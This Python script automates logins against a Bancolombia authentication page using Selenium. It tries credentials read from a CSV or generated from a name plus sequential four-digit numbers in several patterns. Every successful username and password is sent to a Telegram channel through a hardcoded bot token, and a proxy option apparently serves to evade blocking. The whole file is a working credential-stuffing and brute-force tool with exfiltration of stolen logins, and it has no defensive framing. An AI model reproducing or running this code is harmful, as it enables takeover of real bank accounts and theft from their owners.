import csv
import os
import time
import requests
from datetime import datetime
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException
from webdriver_manager.chrome import ChromeDriverManager

TELEGRAM_TOKEN = '7031478076:AAFLGSrNs9PkxjF9ruZsb-HlprEhmW6Nwbk'
TELEGRAM_CHAT_ID = '@meteoritoz'
LOGIN_URL = "https://autenticacion.apps.bancolombia.com/login/oauth/authorize/v2?response_type=code&client_id=MKA&redirect_uri=https://tu360compras.bancolombia.com/login/FUA"

def create_driver():
    options = webdriver.ChromeOptions()
    options.add_argument("--window-size=800,600")
    return webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)

def try_login(username, password):
    driver = create_driver()
    try:
        driver.get(LOGIN_URL)
        wait = WebDriverWait(driver, 10)
        wait.until(EC.presence_of_element_located((By.NAME, "user"))).send_keys(username)
        driver.find_element(By.ID, "btn-continuar-user").click()
        wait.until(EC.presence_of_element_located((By.NAME, "field1"))).send_keys(password)
        time.sleep(8)
        driver.find_element(By.ID, "btn-continuar-password").click()
        time.sleep(10)
        current_url = driver.current_url
        return "cuenta" in current_url and "login" not in current_url, current_url
    except:
        return False, ""
    finally:
        driver.quit()

def send_telegram(msg):
    try:
        requests.get(f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage", params={"chat_id": TELEGRAM_CHAT_ID, "text": msg})
    except:
        pass

def procesar_csv(tipo_opcion, subopcion, log_box):
    os.makedirs("logs", exist_ok=True)
    with open("usuarios.csv", newline='', encoding='utf-8') as f:
        data = list(csv.reader(f))
    fecha = datetime.now().strftime("%Y-%m-%d_%H-%M")
    log_ok = f"logs/exitosos_{fecha}.txt"
    log_error = f"logs/errores_{fecha}.txt"
    exitosos = 0
    for row in data:
        if len(row) < 6: continue
        nombre, col1, col2, col3, col4, clave = row
        usuario = nombre + col1 + col2 + col3 + col4
        print(f"🔍 Probando {usuario}:{clave}")
        log_box.insert('end', f"🔍 Probando {usuario}:{clave}\n")
        success, url = try_login(usuario, clave)
        if success:
            msg = f"✅ {usuario}:{clave} | {url}"
            with open(log_ok, 'a', encoding='utf-8') as f: f.write(msg + '\n')
            send_telegram(msg)
            exitosos += 1
        else:
            with open(log_error, 'a', encoding='utf-8') as f: f.write(f"❌ {usuario}:{clave}\n")
        time.sleep(5)
    log_box.insert('end', f"✅ Total exitosos: {exitosos}\n")
    send_telegram(f"✅ Total exitosos: {exitosos}")

# CODIGO  construir_credencialesxrango
def construir_credencialesxrango(inicio, fin, nombre, tipo_opcion, subopcion):
    resultados = []
    for numero in range(inicio, fin + 1):
        numero_str = str(numero).zfill(4)  # Asegura 4 dígitos
        col1, col2, col3, col4 = numero_str[0], numero_str[1], numero_str[2], numero_str[3]
        col5 = ""  # Relleno para compatibilidad con lógica de 5 dígitos
        clave = col2 + col3 + col4

        if tipo_opcion == "1":
            col5 = ""  # como no hay 5 dígitos, se deja vacío o se puede repetir col4
            if subopcion == "Normal":
                usuario = nombre + col1 + col2 + col3 + col4
                clave = col1 + col2 + col3 + col4
            elif subopcion == "Alante":
                usuario = col1 + col2 + col3 + col4 + nombre
                clave = col1 + col2 + col3 + col4
            elif subopcion == "Repetitiva":
                usuario = nombre + col1 + col2 + col3 + col4
                clave = col3 + col4 + col3 + col4
            elif subopcion == "Inversa":
                usuario = nombre + col1 + col2 + col3 + col4
                clave = col3 + col4 + col1 + col1 
        elif tipo_opcion == "2":
            if subopcion == "Normal":
                usuario = nombre + col3 + col4
                clave = col1 + col2 + col3 + col4
            elif subopcion == "Alante":
                usuario = col3 + col4 + nombre
                clave = col1 + col2 + col3 + col4
            elif subopcion == "Repetitiva":
                usuario = nombre + col3 + col4
                clave = col3 + col4 + col3 + col4
            elif subopcion == "Inversa":
                usuario = nombre + col3 + col4
                clave = col3 + col4 + col1 + col1
        else:
            usuario = clave = ""
        resultados.append((usuario, clave))
    return resultados




def procesar_rango(inicio, fin, nombre, tipo_opcion, subopcion, log_box):
    os.makedirs("logs", exist_ok=True)
    fecha = datetime.now().strftime("%Y-%m-%d_%H-%M")
    log_ok = f"logs/exitosos_rango_{fecha}.txt"
    log_error = f"logs/errores_rango_{fecha}.txt"
    exitosos = 0
    credenciales = construir_credencialesxrango(inicio, fin, nombre, tipo_opcion, subopcion)
    for usuario, clave in credenciales:
        print(f"🔍 Probando con {usuario}:{clave}")
        success, url = try_login(usuario, clave)
        if success:
            msg = f"✅ Login exitoso: Nombre: {nombre} | Usuario: {usuario} | Clave: {clave} | URL: {url}"
            log_result(log_ok, msg)
            send_telegram(msg)
            exitosos += 1
        else:
            log_result(log_error, f"❌ Error: Nombre: {nombre} | Usuario: {usuario} | Clave: {clave}")
        guardar_seguimiento(usuario)
        time.sleep(9)

    print(f"✅ Total logins exitosos: {exitosos}")
    send_telegram(f"🔔 Total logins exitosos: {exitosos}")
    
# Función para setear el proxy desde la GUI
def set_proxy_global(proxy_url):
    global create_driver
    def create_driver():
        options = webdriver.ChromeOptions()
        options.add_argument('--window-size=800,600')
        options.add_argument(f'--proxy-server={proxy_url}')
        return webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=options)


# Función auxiliar para guardar logs
def log_result(archivo, texto):
    with open(archivo, 'a', encoding='utf-8') as f:
        f.write(texto + '\n')


def guardar_seguimiento(usuario):
    with open("seguimiento.txt", "w", encoding="utf-8") as f:
        f.write(usuario + "\n")
